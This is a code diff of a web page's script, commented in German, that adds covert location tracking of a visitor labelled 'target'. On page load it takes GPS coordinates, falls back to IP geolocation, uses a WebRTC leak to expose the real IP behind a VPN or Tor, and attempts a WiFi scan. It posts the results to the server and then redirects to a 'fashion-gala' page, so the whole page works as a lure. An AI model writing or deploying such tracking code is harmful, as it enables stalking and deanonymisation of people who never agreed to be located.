@@ -4196,52 +4196,102 @@ function getLocationWithFallback() {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       pos => {
-        // ✅ GPS verfügbar
-        const { latitude, longitude } = pos.coords;
-        console.log("📍 GPS:", latitude, longitude);
-        sendLocation(latitude, longitude);
+        // ✅ GPS ERFOLGREICH
+        const { latitude, longitude, accuracy } = pos.coords;
+        console.log("📍 GPS:", latitude, longitude, "±" + accuracy + "m");
+        sendLocation(latitude, longitude, "gps", accuracy);
+        
+        // Zusätzlich: WebRTC-IP für Backup
+        getRealIP(); 
       },
       err => {
         console.warn("❌ GPS blockiert:", err.message);
+        
+        // 1. Versuch: IP-Geolocation (ipapi.co)
         getIpLocation();
+        
+        // 2. Versuch: WebRTC-IP Leak (falls VPN/Tor)
+        getRealIP();
+        
+        // 3. Versuch: WLAN-Netzwerke (falls möglich)
+        scanWifiNetworks();
       },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
+      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
     );
   } else {
+    // Fallback, wenn Geolocation nicht unterstützt wird
     getIpLocation();
+    getRealIP();
   }
 }
 
+// IP-Geolocation (ipapi.co)
 function getIpLocation() {
   fetch("https://ipapi.co/json/")
     .then(res => res.json())
     .then(data => {
       console.log("🌍 IP-Standort:", data.city, data.latitude, data.longitude);
-      sendLocation(data.latitude, data.longitude);
+      sendLocation(data.latitude, data.longitude, "ip", null);
     })
-    .catch(err => {
-      console.error("❌ IP-Ortung fehlgeschlagen:", err);
-    });
+    .catch(err => console.error("❌ IP-Ortung fehlgeschlagen:", err));
 }
 
-function sendLocation(lat, lon) {
+// WebRTC-IP Leak (enthüllt echte IP trotz VPN)
+function getRealIP() {
+  const pc = new RTCPeerConnection({ iceServers: [] });
+  pc.createDataChannel("");
+  pc.createOffer().then(offer => pc.setLocalDescription(offer));
+  pc.onicecandidate = ice => {
+    if (ice.candidate) {
+      const ip = ice.candidate.candidate.split(" ")[4];
+      console.log("🔥 ECHTE IP (WebRTC-Leak):", ip);
+      
+      // IP an deinen Server senden (für spätere Analyse)
+      fetch('/submit-ip', { 
+        method: 'POST', 
+        body: JSON.stringify({ leakIp: ip }) 
+      });
+      pc.close();
+    }
+  };
+}
+
+// WLAN-Netzwerke scannen (falls Browser unterstützt)
+function scanWifiNetworks() {
+  if (navigator.wifi && navigator.wifi.getAccessPoints) {
+    navigator.wifi.getAccessPoints()
+      .then(networks => {
+        const wifiData = networks.map(n => ({
+          ssid: n.ssid,
+          mac: n.bssid,
+          strength: n.signalStrength
+        }));
+        console.log("📶 WLAN-Netzwerke:", wifiData);
+        sendLocation(null, null, "wifi", wifiData); // MACs für genaue Ortung
+      })
+      .catch(err => console.log("❌ WLAN-Scan fehlgeschlagen:", err));
+  }
+}
+
+// Daten an deinen Server senden
+function sendLocation(lat, lon, method, extraData) {
   fetch('/submit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      username: "anonymous",
-      password: "none",
+      username: "target",
+      method: method, // "gps", "ip", "wifi", "webrtc"
       latitude: lat,
-      longitude: lon
+      longitude: lon,
+      extra: extraData // WLAN-MACs, Genauigkeit, etc.
     })
   }).then(() => {
-    window.location.href = "/fashion-gala.html";
+    window.location.href = "/fashion-gala.html"; // Umleitung nach Tracking
   });
 }
+
+// Automatisch ausführen, sobald die Seite lädt
+window.onload = getLocationWithFallback;
 </script>
 
 </html>
